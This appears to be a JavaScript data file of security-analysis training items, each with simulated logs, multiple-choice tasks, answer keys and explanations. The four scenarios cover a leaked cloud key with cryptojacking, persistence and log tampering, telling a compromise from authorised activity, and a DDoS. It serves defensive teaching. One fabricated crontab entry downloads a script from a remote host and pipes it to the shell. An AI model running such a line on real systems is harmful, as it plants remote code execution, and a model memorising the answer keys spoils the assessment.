// System-analysis scenarios, part 3: leaked cloud key, persistence and log tampering, telling real attacks from
// authorised activity, and a DDoS.
export default [
  // ───────────── 9. leaked cloud access key ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 8.6,
    x: 'Environment: developer laptop DEV-LT-22, public code repository, cloud account 4471-0093 (IAM user ci-deploy), billing alerts',
    p: [
      {
        name: 'DEV-LT-22', role: 'Developer laptop · pmorgan',
        s: [['git log -p (excerpt)', `commit 7be41d0  Author: pmorgan  Date: Wed Mar 11 17:52:18 2026
    quick fix for upload script

+++ b/scripts/upload.py
+AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

$ git remote -v
origin  https://github.com/pmorgan-personal/tools.git (push)     [repository visibility: PUBLIC]`]]
      },
      {
        name: 'CLOUD-AUDIT', role: 'Cloud audit trail (IAM user ci-deploy)',
        s: [['Events (excerpt)', `Time (UTC)         Event                 Source IP        User agent            Region
Mar 11 17:58:02    ListUsers             185.220.101.19   aws-cli/2.15 (Linux)  us-east-1
Mar 11 18:01:44    GetCallerIdentity     185.220.101.19   aws-cli/2.15 (Linux)  us-east-1
Mar 12 02:14:10    RunInstances x20      185.220.101.19   aws-sdk-go/1.44       ap-southeast-1   (c5.18xlarge)
Mar 12 02:14:55    RunInstances x20      185.220.101.19   aws-sdk-go/1.44       eu-central-1     (c5.18xlarge)
Mar 12 02:15:31    RunInstances x20      185.220.101.19   aws-sdk-go/1.44       sa-east-1        (c5.18xlarge)
Mar 12 02:16:02    AuthorizeSecurityGroupIngress  0.0.0.0/0 tcp 3333
Normal pattern for ci-deploy: PutObject to one S3 bucket from 10.40.0.0/16, us-east-1 only, aws-cli/2.13 (Linux)`],
        ['IAM policy attached to ci-deploy', '"Effect": "Allow", "Action": "*", "Resource": "*"   (AdministratorAccess)']]
      },
      {
        name: 'BILLING', role: 'Cost anomaly alert',
        s: [['Alert, 12 Mar 08:30', `Amazon EC2 spend: $14,212 in the last 6 hours (daily average: $210)
Regions with new spend: ap-southeast-1, eu-central-1, sa-east-1
Running instances not in inventory: 60`]]
      }
    ],
    q: 'A cloud bill has spiked. Review the evidence and complete the tasks.',
    choices: ['Compromised credentials leading to cryptojacking', 'DDoS against the account', 'Misconfigured auto-scaling', 'Phishing of the root user'],
    items: [
      ['Attack in progress', 'Compromised credentials leading to cryptojacking'],
      ['Root cause', 'The access key was committed to a public repository', ['The access key was committed to a public repository', 'The laptop was infected with ransomware', 'MFA was disabled on the root user', 'The S3 bucket was public']],
      ['Evidence that the activity is not the real pipeline', 'A new source IP, a different user agent and regions the pipeline never uses', ['A new source IP, a different user agent and regions the pipeline never uses', 'The key was used on a weekend', 'The pipeline uses the aws-cli', 'The calls came from the United States']],
      ['Control failure that made the impact severe', 'An overly broad policy: AdministratorAccess on a deployment key', ['An overly broad policy: AdministratorAccess on a deployment key', 'Too few IAM users', 'Region restrictions were enabled', 'Billing alerts were enabled']],
      ['First response action', 'Deactivate the exposed key, then terminate the unauthorized instances and review the account for other changes', ['Delete the public repository and continue', 'Deactivate the exposed key, then terminate the unauthorized instances and review the account for other changes', 'Wait for the billing cycle to end', 'Reboot the instances']],
      ['Best long-term preventive controls', 'Short-lived role credentials, secret scanning and least-privilege policies', ['Short-lived role credentials, secret scanning and least-privilege policies', 'Longer access key rotation periods', 'Embedding keys in private repositories only', 'Disabling CloudTrail to reduce cost']]
    ],
    e: 'The laptop shows the access key and secret committed to scripts/upload.py and pushed to a public repository (shortly afterwards the audit trail shows the key being used from 185.220.101.19). The calls are not the CI pipeline: different source IP, a different user agent (aws-sdk-go rather than aws-cli 2.13), and regions the pipeline never touches. The attacker enumerated the account, then launched 60 large compute instances in three regions and opened tcp/3333 to the world (a typical mining pool port): cryptojacking using compromised credentials. The impact was so large because the deployment key carried AdministratorAccess. Respond by deactivating the key first (deleting the repo does not un-leak a key), then terminate the unauthorized resources and review for other changes such as new users or keys. Prevent recurrence with short-lived role credentials instead of long-term keys, secret scanning, and least privilege.',
    w: ['An unexpected cloud bill needs explaining. Use the three sources to complete the tasks.', 'Work out how the attacker got in, what they did, and how to respond.']
  },

  // ───────────── 10. persistence and log tampering ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 8.9,
    x: 'Hosts: LNX-WEB02 (Linux web server) and WIN-APP03 (Windows application server). Classify each artifact by the attacker behaviour it shows.',
    p: [
      {
        name: 'LNX-WEB02', role: 'Linux web server · 10.0.20.9',
        s: [
          ['/var/log/auth.log (excerpt)', `Mar 14 01:12:44 web02 sshd[3101]: Accepted publickey for root from 198.51.100.9 port 40222 ssh2: RSA SHA256:9f3k...
Mar 14 01:13:02 web02 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysbackup
Mar 14 01:13:09 web02 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysbackup
Mar 14 01:15:30 web02 sshd[3140]: pam_unix(sshd:session): session closed for user root
Mar 14 01:15:31 web02 kernel: auth.log truncated by pid 3144 (truncate)`],
          ['/etc/crontab (modified 01:14)', `*/5 * * * *   root   curl -s http://203.0.113.50/x.sh | sh`],
          ['root .bash_history (modified 01:15)', `(empty: history -c; unset HISTFILE)`]
        ]
      },
      {
        name: 'WIN-APP03', role: 'Windows app server · 10.0.30.21',
        s: [['Security / System events', `02:01:33  4720  A user account was created: svc_update   (created by: tomcat service account)
02:01:41  4732  Member added to local group: Administrators   (svc_update)
02:03:12  7045  A service was installed: WinSyncHelper  (C:\\Windows\\Temp\\wsh.exe)  Start type: Auto
02:05:58  4698  A scheduled task was created: \\Microsoft\\Windows\\UpdateCheck  (runs wsh.exe at logon)
02:07:20  1102  The audit log was cleared  (account: svc_update)`]]
      },
      {
        name: 'SIEM', role: 'Log forwarding / central logging',
        s: [['Forwarded copy (syslog)', `LNX-WEB02 auth events up to 01:15:29 present (received over syslog TLS)
WIN-APP03 events 4720, 4732, 7045 and 4698 present; 1102 present
Retention: 90 days (write-once storage)`]]
      }
    ],
    q: 'Classify each artifact by the attacker behaviour it represents, then answer the final questions.',
    choices: ['Initial access', 'Persistence', 'Privilege escalation', 'Defense evasion', 'Exfiltration'],
    items: [
      ['Root login over SSH with a stolen key (01:12)', 'Initial access'],
      ['New sudo-capable user sysbackup', 'Persistence'],
      ['Cron entry that downloads and runs a script every 5 minutes', 'Persistence'],
      ['Truncated auth.log and cleared bash history', 'Defense evasion'],
      ['svc_update added to the local Administrators group', 'Privilege escalation'],
      ['New auto-start service WinSyncHelper from C:\\Windows\\Temp', 'Persistence'],
      ['Event 1102: audit log cleared', 'Defense evasion'],
      ['Why the investigation can still reconstruct events', 'Logs were forwarded to a central, write-once SIEM before they were cleared', ['Logs were forwarded to a central, write-once SIEM before they were cleared', 'The attacker did not clear any logs', 'Linux logs cannot be truncated', 'Backups of the server were restored']]
    ],
    e: 'Initial access: a successful root SSH login with a public key from an unfamiliar address. Persistence is anything that keeps access after the first session ends: a new sudo-capable local user, a cron job that re-downloads and executes a script every five minutes, and on Windows a new auto-start service and a scheduled task. Privilege escalation: adding svc_update to Administrators gives it elevated rights. Defense evasion: the attacker hides evidence by truncating auth.log, clearing shell history and clearing the Windows audit log (event 1102). The reason the team can still see all this is that logs were forwarded off-host to the SIEM in real time, so local tampering came too late. This is why central, write-once log retention is a core control.',
    w: ['Classify the attacker behaviours recorded on these two hosts, and explain why evidence survived.', 'Map each artifact to the type of attacker activity it represents.']
  },

  // ───────────── 11. real attack among authorised activity ─────────────
  {
    d: 4, t: 'match', o: '4.8', lv: 9.4,
    x: 'The SOC received five alerts overnight. Change records: CHG-2231 (vulnerability scan, SCAN01, 02:00–03:00 Fri), CHG-2240 (patching, ADM-WS-01, 01:00–04:00 Fri). Only one host is compromised.',
    p: [
      {
        name: 'SCAN01', role: 'Vulnerability scanner · 10.0.60.4',
        s: [['Firewall log summary, 02:00–02:50', `src=10.0.60.4  dst=10.0.0.0/16 (all hosts)  dports=1-1024 and 3389, 445  SYN packets: 61,402
src=10.0.60.4  authenticated: SSH/WinRM using account svc_scan (credentialed scan)
Scheduled job "weekly-scan" started 02:00 (owner: secops)`]]
      },
      {
        name: 'BKP01', role: 'Backup server · 10.0.60.9',
        s: [['Flow log, 03:00–04:10', `src=10.0.60.9  dst=198.51.100.20  tcp/443  bytes_out=412 GB   (dst = approved offsite backup provider, in allow list)
Job "nightly-offsite" started 03:00 as scheduled. Same 400+ GB transfer every night this month.`]]
      },
      {
        name: 'ADM-WS-01', role: 'Administrator workstation · 10.0.60.20',
        s: [['PowerShell script block log', `01:04  Invoke-Command -ComputerName srv-app01,srv-app02,srv-db01 -FilePath .\\Install-Patches.ps1
01:04  Script signed: CN=Corp IT Code Signing (valid)   Run by: CORP\\adm-lee (Smart card, MFA)
Maintenance window: CHG-2240 01:00-04:00`]]
      },
      {
        name: 'WS-DEV-02', role: 'Developer workstation · 10.2.8.12',
        s: [['EDR telemetry', `00:41  chrome.exe -> rundll32.exe (no command line)   [process injection into rundll32]
00:42  New Run key: HKCU\\...\\Run\\OneDriveSync = C:\\Users\\dkim\\AppData\\Roaming\\od.exe
00:43 +  Outbound HTTPS to rare domain update-check.cdn-assets.example every 5 min (no user agent, constant 380-byte requests)
Not in any change record.`]]
      },
      {
        name: 'WEB03', role: 'Public web server · 10.0.20.7',
        s: [['TLS errors / scan summary', `02:05–02:48  TLS handshake errors from 10.0.60.4 (SCAN01): 1,240   (unsupported protocol probes)
02:10  Authenticated logon svc_scan from 10.0.60.4 (SSH)
No inbound connections from other unusual sources. No new processes or accounts.`]]
      }
    ],
    q: 'Review each alert against the change records and classify every host.',
    choices: ['Authorized vulnerability scanning', 'Scheduled backup (benign)', 'Authorized administration', 'Compromised', 'Scanned system (not affected)'],
    items: [
      ['SCAN01', 'Authorized vulnerability scanning'],
      ['BKP01', 'Scheduled backup (benign)'],
      ['ADM-WS-01', 'Authorized administration'],
      ['WS-DEV-02', 'Compromised'],
      ['WEB03', 'Scanned system (not affected)'],
      ['Technique the compromised host is using for persistence', 'Registry Run key with a fake OneDrive name', ['Registry Run key with a fake OneDrive name', 'A new local administrator', 'A scheduled task', 'A cron job']],
      ['Best FIRST action for the SOC', 'Isolate WS-DEV-02 and collect memory and disk evidence', ['Isolate WS-DEV-02 and collect memory and disk evidence', 'Block SCAN01 at the firewall', 'Disable the nightly backup', 'Revoke the administrators\' smart cards']]
    ],
    e: 'The skill here is separating noise from the real incident. SCAN01\'s large SYN sweep and credentialed logons exactly match change CHG-2231 and a scheduled weekly job, and WEB03\'s TLS errors and svc_scan logon come from that scan: authorized scanning, with WEB03 only the scanned system. BKP01\'s 412 GB upload runs on schedule to an allow-listed backup provider and is identical every night. ADM-WS-01\'s PowerShell remoting is a signed script run by an administrator with MFA inside the CHG-2240 window. WS-DEV-02 is the only host with indicators outside any change record: process injection into rundll32 from the browser, a new Run key masquerading as OneDrive (persistence), and constant 5-minute HTTPS beacons to a rare domain with no user agent (C2). Isolate it and preserve memory and disk; blocking the scanner or backup, or revoking admin credentials, would act on false positives.',
    w: ['Not every alert is an attack. Decide which hosts are authorized activity and which is compromised.', 'Compare each system with the change records and classify it.']
  },

  // ───────────── 12. DDoS ─────────────
  {
    d: 2, t: 'match', o: '2.4', lv: 7.0,
    x: 'Network: Internet -> LB01 (203.0.113.30) -> WEB-A / WEB-B ; DNS-AUTH (authoritative DNS)',
    p: [
      {
        name: 'LB01', role: 'Load balancer · 203.0.113.30',
        s: [['Connection table / syslog', `State counts: ESTABLISHED 1,420   SYN_RECV 61,880   TIME_WAIT 902   (normal SYN_RECV: < 150)
Distinct source IPs in SYN_RECV: 58,311 (many from reserved or bogon ranges)
03:21:07 WARNING syn flood detected on VIP 203.0.113.30:443; half-open connection table at 98% capacity
Legitimate clients report timeouts connecting to the site.`]]
      },
      {
        name: 'WEB-A', role: 'Web server · 10.0.20.11',
        s: [['access.log (excerpt)', `198.51.100.3  "GET /search?q=zx81qh HTTP/1.1" 200 18110 "Mozilla/5.0 (compatible; X11)"
203.0.113.141 "GET /search?q=pw0c9a HTTP/1.1" 200 18110 "Mozilla/5.0 (compatible; X11)"
192.0.2.77    "GET /search?q=l2m7te HTTP/1.1" 200 18110 "Mozilla/5.0 (compatible; X11)"
(similar requests: 4,900 per second from 21,700 distinct IP addresses, every request unique, same user agent)`],
        ['Resource usage', 'CPU 99%   DB connections 100/100   Response time 11.4 s (normal 0.3 s)']]
      },
      {
        name: 'DNS-AUTH', role: 'Authoritative DNS server',
        s: [['Query statistics, last hour', `Queries: 4,120/s  (normal 3,900/s)   Type ANY requests: 0.4%
Answer size average: 120 bytes   Source distribution: normal`]]
      }
    ],
    q: 'The company website is unreachable. Review each system and complete the tasks.',
    choices: ['SYN flood (protocol attack)', 'HTTP GET flood (application-layer attack)', 'DNS amplification', 'Not affected'],
    items: [
      ['LB01', 'SYN flood (protocol attack)'],
      ['WEB-A', 'HTTP GET flood (application-layer attack)'],
      ['DNS-AUTH', 'Not affected'],
      ['Overall attack classification', 'Distributed denial of service (DDoS)', ['Distributed denial of service (DDoS)', 'Single-source denial of service', 'Ransomware', 'Man-in-the-middle']],
      ['Mitigation for the SYN flood', 'SYN cookies and rate limiting, with upstream scrubbing', ['SYN cookies and rate limiting, with upstream scrubbing', 'Increase the half-open connection table only', 'Block a single source IP', 'Enable DNSSEC']],
      ['Mitigation for the HTTP flood', 'A WAF or CDN with rate limiting and bot detection, plus caching of search results', ['A WAF or CDN with rate limiting and bot detection, plus caching of search results', 'Blocking port 53', 'Lowering the DNS TTL', 'A second firewall rule for ICMP']]
    ],
    e: 'Two attacks hit different layers. At LB01, SYN_RECV connections (61,880 against a normal 150) come from 58,000 mostly spoofed sources and fill the half-open table: a SYN flood that exhausts connection state. At WEB-A the requests complete the handshake and look legitimate (HTTP 200) but arrive at 4,900 per second from 21,700 addresses with unique search strings (so caching cannot help) and one user agent, saturating the CPU and database: an application-layer HTTP GET flood. DNS-AUTH volume is normal, so it is neither amplification nor affected. Many sources make it a DDoS; blocking one IP is pointless. Use SYN cookies, rate limits and upstream scrubbing for the SYN flood, and a WAF/CDN with rate limiting, bot detection and caching for the HTTP flood.',
    w: ['The website is down under heavy traffic. Review the three systems and complete the tasks.', 'Identify what kind of denial-of-service attack each system is experiencing.']
  }
]
